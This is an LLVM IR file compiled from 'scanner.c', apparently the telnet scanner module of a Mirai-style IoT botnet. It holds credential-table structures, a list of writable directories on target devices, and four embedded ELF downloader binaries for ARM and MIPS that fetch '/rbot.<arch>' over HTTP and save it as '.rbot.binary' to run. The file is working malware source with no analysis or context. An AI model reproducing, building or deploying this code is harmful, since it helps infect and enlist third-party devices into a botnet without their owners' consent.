; ModuleID = 'scanner.c'
source_filename = "scanner.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.payload = type { i8, i8, i8*, i16 }
%struct.scanner_connection = type { %struct.scanner_auth*, %struct.telnet_info, i32, i32, i32, i32, i32, [8192 x i8], [16 x i8], i8, i8, i8, i8, i16, i16, i32, i32 }
%struct.telnet_info = type { i32, i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.binary = type { i8*, i8 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%union.__SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.resolv_entries = type opaque

@auth_table_len = dso_local global i32 0, align 4
@scanner_rawpkt = dso_local global [40 x i8] zeroinitializer, align 16
@auth_table = dso_local global %struct.scanner_auth* null, align 8
@auth_table_max_weight = dso_local global i16 0, align 2
@fake_time = dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"/bin/\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"/etc/\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"/var/Sofia\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c".\00", align 1
@tmp_dirs = dso_local global [15 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0)], align 16
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [1081 x i8] c"\7FELF\01\01\01a\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00\DC\82\00\004\00\00\00p\03\00\00\02\02\00\004\00 \00\02\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00P\03\00\00P\03\00\00\05\00\00\00\00\80\00\00\01\00\00\00P\03\00\00P\03\01\00P\03\01\00\00\00\00\00\08\00\00\00\06\00\00\00\00\80\00\00\01\18\A0\E1\FF\18\01\E2\00\1C\81\E1\FF0\03\E2\02$\A0\E1\03\10\81\E1\FF,\02\E2\01 \82\E1\FF<\02\E2\FF\08\02\E2\034\A0\E1 \04\A0\E1\22\0C\80\E1\02<\83\E1\00\00\83\E1\0E\F0\A0\E1\00\10\A0\E1\00\00\9F\E5\87\00\00\EA\01\00\90\00\00\10\A0\E1\00\00\9F\E5\83\00\00\EA\06\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1|\00\00\EA\05\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\03\10\A0\E3\0D \A0\E1\08\00\9F\E5t\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1k\00\00\EA\04\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1d\00\00\EA\03\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\01\10\A0\E3\0D \A0\E1\08\00\9F\E5\\\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\F0A-\E9@\E1\9F\E5\94\D0M\E2\00\00\00\EA\01\E0\8E\E2\00`\DE\E5\00\00V\E3\FB\FF\FF\1A$\C1\9F\E5\D00\A0\E3\0E\80l\E0\02@\A0\E3P\C0\A0\E3k\10\A0\E3\85 \A0\E3\B0\00\A0\E3\83\C0\CD\E5\80@\CD\E5\81`\CD\E5\82`\CD\E5\A9\FF\FF\EB\F4\10\9F\E5\84\00\8D\E5\F0 \9F\E5\F0\00\9F\E5\BC\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\04\00\A0\E1\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\AA\FF\FF\0B\05\00\A0\E1\80\10\8D\E2\10 \A0\E3\B5\FF\FF\EB\00\00P\E3\00\00`\B2\A3\FF\FF\BB\17@\88\E2\05\00\A0\E1\A0\10\9F\E5\04 \A0\E1\B7\FF\FF\EB\04\00P\E1\03\00\A0\13\9B\FF\FF\1B\06@\A0\E1\93\10\8D\E2\01 \A0\E3\05\00\A0\E1\B6\FF\FF\EB\01\00P\E3\04\00\A0\E3\93\FF\FF\1B\930\DD\E5\04D\83\E1d0\9F\E5\03\00T\E1\F3\FF\FF\1A\0D\10\A0\E1\80 \A0\E3\05\00\A0\E1\AA\FF\FF\EB\00 P\E2\0D@\A0\E1\0D\10\A0\E1\07\00\A0\E1\01\00\00\DA\9D\FF\FF\EB\F4\FF\FF\EA\05\00\A0\E1\85\FF\FF\EB\07\00\A0\E1\83\FF\FF\EB\05\00\A0\E3}\FF\FF\EB\94\D0\8D\E2\F0\81\BD\E8\1C\83\00\00A\02\00\00\FF\01\00\00$\83\00\004\83\00\00\0A\0D\0A\0D\A5\FF\FF\EAp@-\E9\10@\8D\E2p\00\94\E8q\00\90\EF\01\0Ap\E3\00@\A0\E1p\80\BD\98\03\00\00\EB\000d\E2\000\80\E5\00\00\E0\E3p\80\BD\E8\00\00\9F\E5\0E\F0\A0\E1P\03\01\00arm4\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm4 HTTP/1.0\0D\0A\0D\0A\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00t\80\00\00t\00\00\00\A8\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\1C\83\00\00\1C\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00P\03\01\00P\03\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00P\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.17 = private unnamed_addr constant [1337 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00l\83\00\004\00\00\00H\04\00\00\02\00\00\044\00 \00\04\00(\00\06\00\05\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00\14\04\00\00\14\04\00\00\05\00\00\00\00\80\00\00\01\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\10\00\00\00\10\00\00\00\06\00\00\00\00\80\00\00\07\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\00\00\00\00\08\00\00\00\04\00\00\00\04\00\00\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\018\83\E1\00<\83\E1\024\83\E1\03\0C\A0\E1\02\08\80\E1\FF(\03\E2\22\04\80\E1#\0C\80\E1\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\01\00\A0\E3\9D\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\06\00\A0\E3\95\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\05\00\A0\E3\8A\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5\7F\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\1B\01\00\00\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\04\00\A0\E3s\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\03\00\A0\E3h\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5]\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\19\01\00\00\F0A-\E9@1\9F\E5\98\D0M\E2\00@\A0\E3\00\00\00\EA\01@\84\E2\01`S\E5\00\00V\E3\010\83\E2\FA\FF\FF\1A\02\C0\A0\E3\D00\A0\E3k\10\A0\E3\85 \A0\E3\B4\C8\CD\E1\B0\00\A0\E3\05\CA\A0\E3\B6\C8\CD\E1\9A\FF\FF\EB\FC\10\9F\E5\88\00\8D\E5\F8 \9F\E5\F8\00\9F\E5\AE\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\02\00\A0\E3\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\94\FF\FF\0B\05\00\A0\E1\84\10\8D\E2\10 \A0\E3\AB\FF\FF\EB\00\00P\E3\00\00`\B2\8D\FF\FF\BB\17@\84\E2\05\00\A0\E1\A8\10\9F\E5\04 \A0\E1\AF\FF\FF\EB\04\00P\E1\03\00\A0\13\85\FF\FF\1B\94\80\9F\E5\06@\A0\E1\97`\8D\E2\06\10\A0\E1\01 \A0\E3\05\00\A0\E1\B0\FF\FF\EB\01\00P\E3\04\00\A0\E3{\FF\FF\1B\970\DD\E5\04D\83\E1\08\00T\E1\F4\FF\FF\1A\04@\8D\E2\04\10\A0\E1\80 \A0\E3\05\00\A0\E1\A4\FF\FF\EB\00 P\E2\04\10\A0\E1\07\00\A0\E1\01\00\00\DA\94\FF\FF\EB\F5\FF\FF\EA\05\00\A0\E1r\FF\FF\EB\07\00\A0\E1p\FF\FF\EB\05\00\A0\E3f\FF\FF\EB\98\D0\8D\E2\F0A\BD\E8\1E\FF/\E1\E1\83\00\00A\02\00\00\FF\01\00\00\E8\83\00\00\F8\83\00\00\0A\0D\0A\0D\A5\FF\FF\EA\0D\C0\A0\E1\F0\00-\E9\00p\A0\E1\01\00\A0\E1\02\10\A0\E1\03 \A0\E1x\00\9C\E8\00\00\00\EF\F0\00\BD\E8\01\0Ap\E3\0E\F0\A01\FF\FF\FF\EA\04\E0-\E5\1C \9F\E5\000\A0\E1\02 \9F\E7\06\00\00\EB\000c\E2\020\80\E7\00\00\E0\E3\04\E0\9D\E4\1E\FF/\E1l\80\00\00\00\00\00\00\0F\0A\E0\E3\1F\F0@\E2\00\00\A0\E1\00\00\A0\E1arm7\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm7 HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\08\00\00\00\00.shstrtab\00.text\00.rodata\00.tbss\00.got\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\C0\80\00\00\C0\00\00\00 \03\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\E0\83\00\00\E0\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\04\00\00\14\04\01\00\14\04\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\1F\00\00\00\01\00\00\00\03\00\00\00\14\04\01\00\14\04\00\00\10\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\04\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00$\04\00\00$\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [1889 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\08\00\00\00\01\00@\04`\00\00\004\00\00\06H\00\00\10\07\004\00 \00\03\00(\00\07\00\06\00\00\00\01\00\00\00\00\00@\00\00\00@\00\00\00\00\05\B4\00\00\05\B4\00\00\00\05\00\01\00\00\00\00\00\01\00\00\05\C0\00D\05\C0\00D\05\C0\00\00\00T\00\00\00p\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\000\A5\00\FF\00\05,\00\00\04&\00\00\85 %0\C2\00\FF0\E7\00\FF\00\87 %\00\02\12\00\03\E0\00\08\00D\10%<\1C\00\05'\9C\84\E8\03\99\E0!\8F\99\80\\\00\80(!\03 \00\08$\04\0F\A1<\1C\00\05'\9C\84\CC\03\99\E0!\8F\99\80\\\00\80(!\03 \00\08$\04\0F\A6<\1C\00\05'\9C\84\B0\03\99\E0!\00\A0\10!\8F\99\80\\\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A5<\1C\00\05'\9C\84\88\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\\\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\03\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\84<\03\99\E0!\00\A0\10!\8F\99\80\\\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A4<\1C\00\05'\9C\84\14\03\99\E0!\00\A0\10!\8F\99\80\\\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A3<\1C\00\05'\9C\83\EC\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\\\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\01\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\83\A0\03\99\E0!'\BD\FF@\AF\BF\00\BC\AF\B2\00\B8\AF\B1\00\B4\AF\B0\00\B0\AF\BC\00\10\8F\82\80\18\00\00\00\00$P\05\80\82\02\00\00\00\00\00\00\14@\FF\FD&\10\00\01&\10\FF\FF$\02\00\02\A7\A2\00\1C$\02\00P\A7\A2\00\1E\8F\82\80\18\8F\99\80L$\07\00\D0$\04\00\B0$\05\00k$\06\00\85$B\05\80\03 \F8\09\02\02\80#\8F\BC\00\10$\05\03\01\8F\84\80\18\8F\99\80`$\84\05\88$\06\01\FF\03 \F8\09\AF\A2\00 \8F\BC\00\10$\04\00\02\8F\99\80P$\05\00\02\00\000!\03 \F8\09\00@\90!\00@\88!$\02\FF\FF\8F\BC\00\10\12\22\00\03\00\00\00\00\16B\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\01\8F\BC\00\10\00\00\00\00\8F\99\80D\02  !'\A5\00\1C\03 \F8\09$\06\00\10\8F\BC\00\10\04A\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09\00\02 #\8F\BC\00\10\00\00\00\00\8F\85\80\18\8F\99\80H&\10\00\17$\A5\05\98\02  !\03 \F8\09\02\000!\8F\BC\00\10\10P\00\07\00\00\80!\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\03\8F\BC\00\10\00\00\80!\8F\99\808\02  !'\A5\00\18\03 \F8\09$\06\00\01\8F\BC\00\10$\03\00\01\8F\99\80T\10C\00\04$\04\00\04\03 \F8\09\00\00\00\00\8F\BC\00\10\83\A3\00\18\00\10\12\00\00C\80%<\02\0D\0A4B\0D\0A\16\02\FF\ED\00\00\00\00\8F\99\808'\B0\00,\02  !\02\00(!\03 \F8\09$\06\00\80\8F\BC\00\10\02\00(!\8F\99\80H\00@0!\18@\00\06\02@ !\03 \F8\09\00\00\00\00\8F\BC\00\10\10\00\FF\F0\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02  !\8F\BC\00\10\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02@ !\8F\BC\00\10\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\05\8F\BC\00\10\8F\BF\00\BC\8F\B2\00\B8\8F\B1\00\B4\8F\B0\00\B0\03\E0\00\08'\BD\00\C0<\1C\00\05'\9C\81P\03\99\E0!\03\E0\00!\04\11\00\01\00\00\00\00<\1C\00\05'\9C\818\03\9F\E0!\00\00\F8!\8F\99\80<\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00\00\00\00\00<\1C\00\05'\9C\81\10\03\99\E0!\00\80\10!\00\A0 !\00\C0(!\00\E00!\8F\A7\00\10\8F\A8\00\14\8F\A9\00\18\8F\AA\00\1C'\BD\FF\E0\AF\A8\00\10\AF\A9\00\14\AF\AA\00\18\AF\A2\00\1C\8F\A2\00\1C\00\00\00\0C\14\E0\00\03'\BD\00 \03\E0\00\08\00\00\00\00\00@ !\8F\99\80@\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00<\1C\00\05'\9C\80\A0\03\99\E0!'\BD\FF\E0\AF\BF\00\1C\AF\B0\00\18\AF\BC\00\10\8F\99\804\00\00\00\00\03 \F8\09\00\80\80!\8F\BC\00\10\ACP\00\00\8F\BF\00\1C\8F\B0\00\18$\02\FF\FF\03\E0\00\08'\BD\00 \00\00\00\00\00\00\00\00<\1C\00\05'\9C\80P\03\99\E0!\8F\82\800\03\E0\00\08\00\00\00\00\00\00\00\00\00\00\00\00mips\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mips HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00D\06 \00@\05`\00@\01\9C\00@\02\10\00@\05\10\00@\01(\00@\01t\00@\00\A0\00@\01\C4\00@\00\C8\00@\00\E4\00@\04\A0\00@\01\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00@\00\A0\00\00\00\A0\00\00\04\E0\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00@\05\80\00\00\05\80\00\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\10\00\00\03\00D\05\C0\00\00\05\C0\00\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00D\06 \00\00\06\14\00\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\06\14\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\06\14\00\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@.str.19 = private unnamed_addr constant [1921 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\08\00\01\00\00\00\84\04@\004\00\00\00h\06\00\00\07\10\00\004\00 \00\03\00(\00\07\00\06\00\01\00\00\00\00\00\00\00\00\00@\00\00\00@\00\D4\05\00\00\D4\05\00\00\05\00\00\00\00\00\01\00\01\00\00\00\E0\05\00\00\E0\05D\00\E0\05D\00T\00\00\00p\00\00\00\06\00\00\00\00\00\01\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\FF\00\A50\00,\05\00\00&\04\00% \85\00\FF\00\E70\FF\00\C60% \87\00\002\06\00%0\C4\00\02\22\06\00\00\FF\C30\00\1A\03\00\00\FF\840\00\16\06\00\026\06\00%\10C\00%0\C4\00\08\00\E0\03%\10F\00\05\00\1C<\E4\84\9C'!\E0\99\03\\\80\99\8F!(\80\00\08\00 \03\A1\0F\04$\05\00\1C<\C8\84\9C'!\E0\99\03\\\80\99\8F!(\80\00\08\00 \03\A6\0F\04$\05\00\1C<\AC\84\9C'!\E0\99\03!\10\A0\00\\\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A5\0F\04$\05\00\1C<\84\84\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\\\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\03\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<8\84\9C'!\E0\99\03!\10\A0\00\\\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A4\0F\04$\05\00\1C<\10\84\9C'!\E0\99\03!\10\A0\00\\\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A3\0F\04$\05\00\1C<\E8\83\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\\\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\01\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<\9C\83\9C'!\E0\99\03@\FF\BD'\BC\00\BF\AF\B8\00\B2\AF\B4\00\B1\AF\B0\00\B0\AF\10\00\BC\AF\18\80\82\8F\00\00\00\00\A0\05P$\00\00\02\82\00\00\00\00\FD\FF@\14\01\00\10&\FF\FF\10&\02\00\02$\1C\00\A2\A7\00P\02$\1E\00\A2\A7\18\80\82\8FL\80\99\8F\D0\00\07$\B0\00\04$k\00\05$\85\00\06$\A0\05B$\09\F8 \03#\80\02\02\10\00\BC\8F\01\03\05$\18\80\84\8F`\80\99\8F\A8\05\84$\FF\01\06$\09\F8 \03 \00\A2\AF\10\00\BC\8F\02\00\04$P\80\99\8F\02\00\05$!0\00\00\09\F8 \03!\90@\00!\88@\00\FF\FF\02$\10\00\BC\8F\03\00\22\12\00\00\00\00\07\00B\16\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\01\00\04$\10\00\BC\8F\00\00\00\00D\80\99\8F!  \02\1C\00\A5'\09\F8 \03\10\00\06$\10\00\BC\8F\07\00A\04\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03# \02\00\10\00\BC\8F\00\00\00\00\18\80\85\8FH\80\99\8F\17\00\10&\B8\05\A5$!  \02\09\F8 \03!0\00\02\10\00\BC\8F\07\00P\10!\80\00\00T\80\99\8F\00\00\00\00\09\F8 \03\03\00\04$\10\00\BC\8F!\80\00\008\80\99\8F!  \02\18\00\A5'\09\F8 \03\01\00\06$\10\00\BC\8F\01\00\03$T\80\99\8F\04\00C\10\04\00\04$\09\F8 \03\00\00\00\00\10\00\BC\8F\18\00\A3\83\00\12\10\00%\80C\00\0A\0D\02<\0A\0DB4\ED\FF\02\16\00\00\00\008\80\99\8F,\00\B0'!  \02!(\00\02\09\F8 \03\80\00\06$\10\00\BC\8F!(\00\02H\80\99\8F!0@\00\06\00@\18! @\02\09\F8 \03\00\00\00\00\10\00\BC\8F\F0\FF\00\10\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03!  \02\10\00\BC\8F\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03! @\02\10\00\BC\8F\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\05\00\04$\10\00\BC\8F\BC\00\BF\8F\B8\00\B2\8F\B4\00\B1\8F\B0\00\B0\8F\08\00\E0\03\C0\00\BD'\05\00\1C<L\81\9C'!\E0\99\03!\00\E0\03\01\00\11\04\00\00\00\00\05\00\1C<4\81\9C'!\E0\9F\03!\F8\00\00<\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\10\81\9C'!\E0\99\03!\10\80\00! \A0\00!(\C0\00!0\E0\00\10\00\A7\8F\14\00\A8\8F\18\00\A9\8F\1C\00\AA\8F\E0\FF\BD'\10\00\A8\AF\14\00\A9\AF\18\00\AA\AF\1C\00\A2\AF\1C\00\A2\8F\0C\00\00\00\03\00\E0\14 \00\BD'\08\00\E0\03\00\00\00\00! @\00@\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\A0\80\9C'!\E0\99\03\E0\FF\BD'\1C\00\BF\AF\18\00\B0\AF\10\00\BC\AF4\80\99\8F\00\00\00\00\09\F8 \03!\80\80\00\10\00\BC\8F\00\00P\AC\1C\00\BF\8F\18\00\B0\8F\FF\FF\02$\08\00\E0\03 \00\BD'\00\00\00\00\00\00\00\00\05\00\1C<P\80\9C'!\E0\99\030\80\82\8F\08\00\E0\03\00\00\00\00\00\00\00\00\00\00\00\00mpsl\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mpsl HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00@\06D\00\80\05@\00\C0\01@\004\02@\000\05@\00L\01@\00\98\01@\00\A0\00@\00\E8\01@\00\EC\00@\00\08\01@\00\C0\04@\00$\01@\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\A0\00@\00\A0\00\00\00\00\05\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\A0\05@\00\A0\05\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\00\00\00\03\00\00\10\E0\05D\00\E0\05\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00\00\00@\06D\004\06\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\004\06\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\004\06\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
